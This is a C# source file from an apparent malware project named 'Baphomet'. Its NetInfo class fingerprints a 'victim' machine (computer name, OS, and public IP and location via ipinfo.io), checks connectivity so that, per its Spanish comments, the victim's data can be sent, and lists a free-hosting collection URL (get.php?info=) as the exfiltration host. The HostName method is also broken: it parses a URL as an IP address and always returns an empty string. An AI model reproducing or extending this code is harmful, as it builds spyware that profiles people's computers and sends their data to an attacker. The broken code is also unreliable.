using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using Baphomet.Models;
using System.Net.NetworkInformation;

namespace Baphomet.Utilities
{
    public class NetInfo
    {
        //HttpRequest para obtener info mediante la ip publica.
        public VictimInfoDTO GetVictimInfo()
        {
            var computerName = Environment.MachineName.ToString();
            var operatingSystem = Environment.OSVersion.VersionString;

            WebRequest request = WebRequest.Create("https://ipinfo.io/");
            WebResponse response = request.GetResponse();
            Stream data = response.GetResponseStream();
            string content = String.Empty;
            using (StreamReader sr = new StreamReader(data))
            {
                content = sr.ReadToEnd();
                var contentObje = JsonConvert.DeserializeObject<VictimInfoDTO>(content);
                contentObje.MachineName = computerName;
                contentObje.MachineOs = operatingSystem;
                return contentObje;
            }
        }

        //Verifico si tengo conneccion a internet para poder enviar la data de la victima.
        public bool CheckInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        public string HostName()
        {
            //Aqui va mi lista de host en caso de que uno de ellos falle.
            var hostList = new []
            {
                //"https://wwww.MyExamplehost.com/write.php?info=",
                "https://baphomettest.000webhostapp.com/get.php?info="
            };

            Ping ping = new Ping();
            PingReply reply = ping.Send(IPAddress.Parse("https://baphomettest.000webhostapp.com/"));

            if (reply.Status == IPStatus.Success)
                Console.WriteLine("Address is accessible");

            var hostUp = "";

            return hostUp;
        }
    }
}
